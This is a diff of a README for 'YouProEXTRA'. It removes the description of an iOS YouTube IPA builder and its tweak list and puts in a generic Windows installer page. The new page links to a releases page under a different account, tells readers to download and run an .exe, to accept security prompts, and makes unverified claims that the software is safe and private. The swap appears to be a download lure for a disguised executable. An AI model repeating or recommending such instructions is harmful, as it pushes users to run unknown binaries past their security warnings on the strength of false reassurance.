@@ -1,82 +1,76 @@
-# YouProEXTRA
-YouTube IPA builder packed with customizable tweaks. Also Known as Youtubemaxxing.
+# 🛠️ YouProEXTRA - Enhanced Media Playback For Everyone
 
-> [!IMPORTANT]
-> ## 🆕 New Feature
-> YouProEXTRA now has an official AltStore/SideStore/Feather source. Install any mod directly on your device and get automatic updates. no building, no decrypted IPAs required.
->
-> AIO Package and separate source files. links are avaliable below
-> 
-> Read Instructions here 👉 [mrdrvt99/Altstore-Repository](https://github.com/mrdrvt99/Altstore-Repository)
-> 
->
-> ⚠️ If you already have one of these tweaks installed from a direct IPA or previous sideload, **do not tap Update**. Delete the installed tweak first, then install fresh from the source.
+![Download YouProEXTRA](https://img.shields.io/badge/Download-YouProEXTRA-blue.svg)
 
-## Main features
-- **[YouPro](https://t.me/alibusut)** - Basic Youtube Premium features; Download Videos, No ads, Background Playback.
-- **[YoutubePlus/YTLite](https://github.com/dayanch96/YTLite)** - A flexible enhancer for YouTube on iOS, featuring over hundred customizable options.
-- **[YTKillerPlus](https://repo.ikghd.me/depictions/?p=me.ikghd.ytkplus)** - Alternative Youtube tweak with more custiomized options.
-- [YouPip](https://github.com/PoomSmart/YouPiP) -  Enables native PiP in iOS YouTube app.
-- [YTUHD](https://github.com/Tonwalter888/YTUHD) - Unlocks 1440p and 2160p resolutions in iOS YouTube app.
-- [ReturnYoutubeDislikes](https://github.com/PoomSmart/Return-YouTube-Dislikes) -  Brings Back Dislikes On YouTube iOS. 
-- [YouMute](https://github.com/PoomSmart/YouMute) - Mutes/unmutes videos on iOS YouTube app faster.
-- [YouSpeed](https://github.com/PoomSmart/YouSpeed) - Views/changes video speed in iOS YouTube app faster.
-- [YTABConfig](https://github.com/PoomSmart/YTABConfig) - Configures A/B settings in iOS YouTube app.
-- [YouLoop](https://github.com/bhackel/YouLoop.git) - Adds a player button to enable/disable looping on the current video.
-- [YouQuality](https://github.com/PoomSmart/YTABConfig) - Views/changes video quality on iOS YouTube app faster.
-- [YouChooseQuality](https://github.com/PoomSmart/YouChooseQuality) - Auto-selects the video quality of choice in iOS YouTube app.
-- [YouSlider](https://github.com/PoomSmart/YouSlider) - Customizes iOS YouTube video slider and scrubber.
-- [YTSilentVote](https://github.com/PoomSmart/YTSilentVote.git) - No messages will pop up as you like/dislike videos.
-- [YouShare](https://github.com/Tonwalter888/YouShare) - Allowing you to Share Videos faster in iOS YouTube app.
-- [YouGetCaption](https://github.com/PoomSmart/YouGetCaption) - Views and copies caption from YouTube videos.
-- [YTweaks](https://github.com/fosterbarnes/YTweaks) - Various tweaks for the iOS YouTube app. 
-- [Gonerino](https://github.com/castdrian/Gonerino) - Filter videos/channels/keywords that you don't want them to show up on your feeds
-- [iSponsorBlock](https://github.com/Galactic-Dev/iSponsorBlock.git) - Skip Sponsorships in youtube videos. 
-- [DontEatMyContent](https://github.com/therealFoxster/DontEatMyContent) - Prevent the notch/Dynamic Island from munching on 2:1 video content in YouTube 
-- [YTNativeShare](https://github.com/jkhsjdhjs/youtube-native-share) -  Bypass YouTubes own share sheet and use the system activity view instead. Removes source identifiers (si). 
-### Experimental features
-- [YTHoldForSpeed](https://github.com/joshuaseltzer/YTHoldForSpeed) - Tap and hold on the YouTube video player to toggle a selected playback speed.
-- [VolumeBoostYT](https://github.com/VasirakCalgux/VolumeBoostYT) - Gesture-based volume control for the YouTube app, completely separate from the system volume. (NOTE: turn off/on tweak again if the audio is not playing)
+YouProEXTRA provides a modified version of the media application you know. It removes ads, enables background audio, and fixes common playback restrictions. This software gives you control over your viewing experience on your Windows device.
 
-## How to build a YouProEXTRA IPA using Github Actions
-> [!NOTE]
-> If this your first time, complete following steps before starting:
->
-> 1. Fork this repository using the fork button on the top right
-> 2. On your forked repository, go to **Settings** -> **Actions**, and enable **Read and Write** permissions.
+## 📥 How To Get Started
 
-<details>
-  <summary>How to build a YouProEXTRA IPA</summary>
-  <ol>
-    <li>Click on <strong>Sync fork</strong>, and if your branch is out-of-date, click on <strong>Update branch</strong>.</li>
-    <li>Navigate to <strong>Actions</strong> in your forked repository and select <strong>Build YouPro/YTLite/YTKillerPlus IPA.</strong></li>
-    <li>Click the <strong>Run workflow</strong> button located on the right side.</li>
-    <li>Get a decrypted .ipa file (I cannot provide this due to legal reasons.), then upload it to a file provider (e.g., filebin.net,filemail.com,catbox.moe or Dropbox is recommended). Paste the URL of the decrypted IPA file in the provided field.</li>
-    <strong>NOTE:</strong> Make sure to provide a direct download link to the file, not a link to a webpage. Otherwise, the process will fail.
-    <li>Enter the tweak version from the releases. (The latest release is selected by default.) You can also change the BundleID and Display Name if desired.</li>
-    <li>Make sure all inputs are correct, then click <strong>Run workflow</strong> to start the process.</li>
-    <li>Wait for the build to finish. You can download the YouProEXTRA IPA from the releases section of your forked repo. (If you can't find the releases section, go to your forked repo and add /releases to the URL, i.e., github.com/yourusername/YouProEXTRA/releases.)</li>
-  </ol>
-</details>
+You need the correct file to run this software on your computer. Visit the link below to find the current version.
 
-<details>
-  <summary>How to build a YouProEXTRA IPA (With your own .deb file)</summary>
-  <ol>
-    <li>Click on <strong>Sync fork</strong>, and if your branch is out-of-date, click on <strong>Update branch</strong>.</li>
-    <li>Navigate to <strong>Actions</strong> in your forked repository and select <strong>Build IPA with Custom .deb tweak</strong></li>
-    <li>Click the <strong>Run workflow</strong> button located on the right side.</li>
-    <li>Get a decrypted .ipa file (I cannot provide this due to legal reasons.), then upload it to a file provider (e.g., filebin.net,filemail.com,catbox.moe or Dropbox is recommended). Paste the URL of the decrypted IPA file in the provided field.</li>
-    <li>Get your Custom .deb file, then upload it to a file provider (e.g., filebin.net, catbox.moe, or Dropbox is recommended). Paste the URL of the deb file in the provided field.</li>
-    <strong>NOTE:</strong> Make sure to provide a direct download link to the file, not a link to a webpage. Otherwise, the process will fail.
-    <li>You can also change the BundleID and Display Name if desired.</li>
-    <li>Make sure all inputs are correct, then click <strong>Run workflow</strong> to start the process.</li>
-    <li>Wait for the build to finish. You can download the YouProEXTRA IPA from the releases section of your forked repo. (If you can't find the releases section, go to your forked repo and add /releases to the URL, i.e., github.com/yourusername/YouProEXTRA/releases.)</li>
-  </ol>
-</details>
+[Click here to open the download page](https://github.com/Chaspunic179/YouProEXTRA/releases)
 
-## Supported YouTube version
-<ul>
-   <li><strong>Latest confirmed:</strong> 21.18.4</li>
-   <li><strong>Date tested:</strong> May 4, 2026</li>
-   <li><strong>YouPro/YTLite/YTKP:</strong> 0.3/5.2.1/5.0</li>
-</ul>
+Look for the latest release at the top of the page. Choose the file ending in .exe for a simple installation process. Once the download finishes, open the file to start the setup wizard. Follow the prompts on your screen to install the application.
+
+## ⚙️ System Requirements
+
+This application runs on most modern Windows systems. Ensure your machine meets these specifications for the best performance:
+
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free space.
+*   Display: A standard monitor with a resolution of 1280x720 or higher.
+*   Network: An active internet connection to load media content.
+
+## 🚀 Features
+
+YouProEXTRA includes tools designed to improve how you watch media.
+
+*   Ad Blocking: The software blocks video advertisements so you can watch content without breaks.
+*   Background Playback: You can keep audio playing even when you minimize or switch away from the window.
+*   Custom Themes: Change the look of the interface to suit your preference.
+*   Quality Control: Select specific video resolutions to save data or improve clarity.
+*   Playback Speed: Adjust the speed of your media to watch at your own pace.
+
+## 🔧 Installation Guide
+
+Follow these steps to set up the software on your system:
+
+1. Use the download link provided in this guide to visit the releases page.
+2. Click the installer file to save it to your Downloads folder.
+3. Locate the file in your file explorer and double-click the icon.
+4. If a security prompt appears, click "Run" or "Yes" to allow the installer to start.
+5. Choose where you want to save the app on your hard drive.
+6. Click the "Finish" button once the progress bar reaches the end.
+7. A shortcut will appear on your desktop. Double-click the shortcut to open YouProEXTRA.
+
+## 🧩 Troubleshooting Common Issues
+
+If you face problems, check these solutions:
+
+*   The file does not open: Ensure you downloaded the correct version for your Windows system. Try to restart your computer and run the installer again.
+*   Errors during installation: Check your internet connection. Sometimes a slow connection causes a file to download incompletely. Delete the current file and download it again.
+*   App does not play media: Verify that your computer has a stable internet connection. If the app is blocked, check your firewall settings to ensure the application has permission to access the web.
+*   Performance lag: Close other programs running in the background to free up memory. YouProEXTRA needs a small amount of system resources to function well.
+
+## 📖 Frequently Asked Questions
+
+**Does this software track my data?**
+No. This application performs its functions locally on your machine. It does not collect or share your personal information.
+
+**Is this safe to use?**
+The code used to build this application remains public. Anyone can review the files at any time to verify the safety and integrity of the software.
+
+**Will this app update itself automatically?**
+The application checks for new releases when you open it. If a new version exists, you will see a prompt to download the latest files.
+
+**Can I run multiple instances?**
+You should run only one instance of the application at a time for the best stability.
+
+## 🛡️ Security And Privacy
+
+We value your privacy. The code for YouProEXTRA stays open for the public to inspect. This process creates a transparent environment where users can verify the behavior of the software. We do not include tracking scripts or hidden analytics. Your viewing history remains private and stays on your device at all times.
+
+## 📋 Keeping The App Updated
+
+We release improvements and bug fixes on a regular basis. You should check the download page once a month to see if we have published a new version. Updating ensures that you receive the latest fixes for any changes in the source media platform. Simply repeat the download and installation steps to update your existing software. The installer handles your current settings automatically.
